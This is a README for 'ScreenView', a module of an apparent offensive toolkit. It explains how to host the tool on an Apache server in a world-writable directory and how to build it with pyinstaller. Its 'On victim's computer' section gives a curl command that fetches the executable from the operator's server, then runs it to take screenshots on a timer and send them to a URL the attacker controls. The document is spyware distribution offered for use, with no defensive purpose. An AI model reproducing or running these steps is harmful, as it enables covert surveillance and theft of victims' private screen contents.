# ScreenView
The Shadow Shark ScreenView Module.

## Installation
### Debian
```
$ sudo apt-get install python3 python3-pip git apache2 php libapache2-mod-php
$ sudo service apache2 start
$ cd /var/www/html/
$ sudo mkdir hacks
$ sudo chmod 777 hacks
$ cd hacks/
$ git clone https://github.com/BababooeyHackers/ScreenView.git
$ cd ScreenView/
$ pip3 install -r requirements.txt
```
### Arch
```
$ sudo pacman -S python python-pip git apache php php-apache
$ sudo systemctl start httpd
$ cd /srv/http/
$ sudo mkdir hacks
$ sudo chmod 777 hacks
$ cd hacks/
$ git clone https://github.com/BababooeyHackers/ScreenView.git
$ cd ScreenView/
$ pip3 install -r requirements.txt
```

## Usage
### On victim's computer
```
$ curl http://IP/ScreenView/ScreenView.(exe, app, etc) --output ScreenView.(exe, app, etc)
$ ScreenView.(exe, app, etc) --time (# Minutes) --url (Url to send screenshot to)
```

## Compilation
This module must be compiled on a Linux computer, Windows computer, Wine environment, or MacOS computer.
```
# First install python3 on your Linux computer, Windows computer, Wine environment, or MacOS computer.
$ pip(3) install -r requirements.txt
$ pyinstaller --onefile --icon icon.ico ScreenView.py
